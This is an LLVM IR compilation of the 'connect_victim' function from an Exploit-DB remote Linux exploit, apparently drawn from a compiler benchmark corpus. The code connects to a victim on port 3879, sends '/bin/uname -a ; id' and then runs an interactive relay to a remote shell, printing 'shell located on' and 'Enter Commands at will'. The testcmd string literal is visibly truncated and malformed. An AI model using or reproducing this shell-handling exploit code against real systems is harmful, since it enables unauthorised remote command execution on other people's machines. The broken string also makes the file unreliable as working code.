; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_227.c_connect_victim.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_227.c_connect_victim.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_6__ = type { i64 }
%struct.TYPE_5__ = type { i32 }
%struct.sockaddr_in = type { %struct.TYPE_4__, i32, i32 }
%struct.TYPE_4__ = type { i32 }
%struct.sockaddr = type { i32 }

@connect_victim.testcmd = internal global [256 x i8] c"/bin/uname -a ; idalign 16
@AF_INET = common dso_local global i32 0, align 4
@he = common dso_local global %struct.TYPE_6__* null, align 8
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [34 x i8] c"--- [5] Unable to create socket!\0A\00", align 1
@.str.1 = private unnamed_addr constant [17 x i8] c"Exploit failed!\0A\00", align 1
@brute = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [30 x i8] c"+++ The eip_address is 0x%x\0A\0A\00", align 1
@targets = common dso_local global %struct.TYPE_5__* null, align 8
@type = common dso_local global i64 0, align 8
@.str.3 = private unnamed_addr constant [29 x i8] c"-   [+] shell located on %s\0A\00", align 1
@hostname = common dso_local global i8* null, align 8
@.str.4 = private unnamed_addr constant [33 x i8] c"-   [+] Enter Commands at will\0A\0A\00", align 1
@failure = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [5 x i8] c"EOF\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @connect_victim() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct.sockaddr_in, align 4
  %5 = alloca i32, align 4
  %6 = alloca [1024 x i8], align 16
  %7 = load i32, i32* @AF_INET, align 4
  %8 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i32 0, i32 2
  store i32 %7, i32* %8, align 4
  %9 = call i32 @htons(i32 3879)
  %10 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i32 0, i32 1
  store i32 %9, i32* %10, align 4
  %11 = load %struct.TYPE_6__*, %struct.TYPE_6__** @he, align 8
  %12 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %11, i32 0, i32 0
  %13 = load i64, i64* %12, align 8
  %14 = inttoptr i64 %13 to i32*
  %15 = load i32, i32* %14, align 4
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i32 0, i32 0
  %17 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %16, i32 0, i32 0
  store i32 %15, i32* %17, align 4
  %18 = load i32, i32* @AF_INET, align 4
  %19 = load i32, i32* @SOCK_STREAM, align 4
  %20 = call i32 @socket(i32 %18, i32 %19, i32 0)
  store i32 %20, i32* %2, align 4
  %21 = icmp slt i32 %20, 0
  br i1 %21, label %22, label %25

22:                                               ; preds = %0
  %23 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str, i64 0, i64 0))
  %24 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.1, i64 0, i64 0))
  store i32 -1, i32* %1, align 4
  br label %98

25:                                               ; preds = %0
  %26 = load i32, i32* %2, align 4
  %27 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  %28 = call i64 @connect(i32 %26, %struct.sockaddr* %27, i32 12)
  %29 = icmp slt i64 %28, 0
  br i1 %29, label %30, label %31

30:                                               ; preds = %25
  store i32 -1, i32* %1, align 4
  br label %98

31:                                               ; preds = %25
  %32 = load i64, i64* @brute, align 8
  %33 = icmp ne i64 %32, 0
  br i1 %33, label %34, label %41

34:                                               ; preds = %31
  %35 = load %struct.TYPE_5__*, %struct.TYPE_5__** @targets, align 8
  %36 = load i64, i64* @type, align 8
  %37 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %35, i64 %36
  %38 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %37, i32 0, i32 0
  %39 = load i32, i32* %38, align 4
  %40 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.2, i64 0, i64 0), i32 %39)
  br label %41

41:                                               ; preds = %34, %31
  %42 = load i8*, i8** @hostname, align 8
  %43 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.3, i64 0, i64 0), i8* %42)
  %44 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.4, i64 0, i64 0))
  store i32 -1, i32* @failure, align 4
  %45 = call i32 @FD_ZERO(i32* %5)
  %46 = load i32, i32* %2, align 4
  %47 = call i32 @FD_SET(i32 %46, i32* %5)
  %48 = load i32, i32* %2, align 4
  %49 = call i32 @strlen(i8* getelementptr inbounds ([256 x i8], [256 x i8]* @connect_victim.testcmd, i64 0, i64 0))
  %50 = call i64 @send(i32 %48, i8* getelementptr inbounds ([256 x i8], [256 x i8]* @connect_victim.testcmd, i64 0, i64 0), i32 %49, i32 0)
  br label %51

51:                                               ; preds = %41, %97
  %52 = load i32, i32* %2, align 4
  %53 = call i32 @FD_SET(i32 %52, i32* %5)
  %54 = call i32 @FD_SET(i32 0, i32* %5)
  %55 = load i32, i32* %2, align 4
  %56 = add nsw i32 %55, 1
  %57 = call i64 @select(i32 %56, i32* %5, i32* null, i32* null, i32* null)
  %58 = icmp slt i64 %57, 0
  br i1 %58, label %59, label %60

59:                                               ; preds = %51
  br label %98

60:                                               ; preds = %51
  %61 = load i32, i32* %2, align 4
  %62 = call i64 @FD_ISSET(i32 %61, i32* %5)
  %63 = icmp ne i64 %62, 0
  br i1 %63, label %64, label %79

64:                                               ; preds = %60
  %65 = load i32, i32* %2, align 4
  %66 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %67 = call i32 @read(i32 %65, i8* %66, i32 1024)
  store i32 %67, i32* %3, align 4
  %68 = icmp slt i32 %67, 0
  br i1 %68, label %69, label %72

69:                                               ; preds = %64
  %70 = load i32, i32* @stderr, align 4
  %71 = call i32 @fprintf(i32 %70, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.5, i64 0, i64 0))
  store i32 2, i32* %1, align 4
  br label %98

72:                                               ; preds = %64
  %73 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %74 = load i32, i32* %3, align 4
  %75 = call i64 @write(i32 1, i8* %73, i32 %74)
  %76 = icmp slt i64 %75, 0
  br i1 %76, label %77, label %78

77:                                               ; preds = %72
  br label %98

78:                                               ; preds = %72
  br label %79

79:                                               ; preds = %78, %60
  %80 = call i64 @FD_ISSET(i32 0, i32* %5)
  %81 = icmp ne i64 %80, 0
  br i1 %81, label %82, label %97

82:                                               ; preds = %79
  %83 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %84 = call i32 @read(i32 0, i8* %83, i32 1024)
  store i32 %84, i32* %3, align 4
  %85 = icmp slt i32 %84, 0
  br i1 %85, label %86, label %89

86:                                               ; preds = %82
  %87 = load i32, i32* @stderr, align 4
  %88 = call i32 @fprintf(i32 %87, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.5, i64 0, i64 0))
  store i32 2, i32* %1, align 4
  br label %98

89:                                               ; preds = %82
  %90 = load i32, i32* %2, align 4
  %91 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %92 = load i32, i32* %3, align 4
  %93 = call i64 @send(i32 %90, i8* %91, i32 %92, i32 0)
  %94 = icmp slt i64 %93, 0
  br i1 %94, label %95, label %96

95:                                               ; preds = %89
  br label %98

96:                                               ; preds = %89
  br label %97

97:                                               ; preds = %96, %79
  br label %51

98:                                               ; preds = %22, %30, %69, %86, %95, %77, %59
  %99 = load i32, i32* %1, align 4
  ret i32 %99
}

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @FD_ZERO(i32*) #1

declare dso_local i32 @FD_SET(i32, i32*) #1

declare dso_local i64 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i64 @select(i32, i32*, i32*, i32*, i32*) #1

declare dso_local i64 @FD_ISSET(i32, i32*) #1

declare dso_local i32 @read(i32, i8*, i32) #1

declare dso_local i32 @fprintf(i32, i8*) #1

declare dso_local i64 @write(i32, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
